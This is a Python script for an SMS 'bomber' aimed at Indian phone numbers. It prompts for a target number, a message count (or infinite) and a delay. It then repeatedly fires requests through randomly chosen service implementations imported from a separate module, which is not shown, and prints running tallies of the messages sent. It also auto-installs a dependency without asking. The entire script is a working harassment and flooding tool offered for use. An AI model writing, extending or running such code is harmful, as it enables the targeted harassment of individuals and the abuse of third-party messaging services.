import random
import socket
import platform
import os
import time
import pip

try:
    import requests
except ImportError:
    print('Some dependencies are not installed, wait while they are automatically installed...')
    pip.main(["install", "--user", "requests"])
    import requests


from implementations import IMPLS, AVAIL
from importlib import import_module


for impl in IMPLS:
    import_module(f"implementations.{impl}")


# default country code for India.
COUNTRY_CODE = 91


def internet_check():
    try:
        socket.create_connection(('www.google.com', 443))
        return True
    except ConnectionError:
        return False


def bomb(country_code, number, limit, delt):
    count = 0
    failed = 0
    success = 0
    print("Starting bombing, press ctrl+c or ctrl+z to stop...")
    while success < limit:
        try:
            if random.choice(AVAIL).send(country_code, number):
                res = True
            else:
                res = False
        except:
            res = False
        clrscr()
        count += 1
        if not res:
            failed += 1
        success = count - failed
        print('target number:', str(number))
        print('requests sent:', count)
        print('successful requests:', success)
        print('failed requests:', failed)
        time.sleep(delt)


def infinite(country_code, number, delay):
    count = 0
    failed = 0
    success = count - failed
    print("Starting bombing, press ctrl+c or ctrl+z to stop...")
    while True:
        try:
            if random.choice(AVAIL).send(country_code, number):
                res = True
            else:
                res = False
        except:
            res = False
        clrscr()
        count += 1
        if not res:
            failed += 1
        success = count - failed
        print('target number:', str(number))
        print('requests sent:', count)
        print('successful requests:', success)
        print('failed requests:', failed)
        time.sleep(delay)


def clrscr():
    if platform.system().lower() == "linux":
        os.system('clear')
    else:
        os.system('cls')


if not internet_check():
    print('''your internet doesn't seem to be working. Exiting...''')
    exit(1)

clrscr()
num = int(input('Enter the phone number of the target: +91 '))
lim = int(input("Enter the limit of SMS(0 for infinite): "))
delay = int(input('enter the delay in seconds(recommended: 2 secs): '))

if lim == 0:
    infinite(COUNTRY_CODE, num, delay)
else:
    bomb(COUNTRY_CODE, num, lim, delay)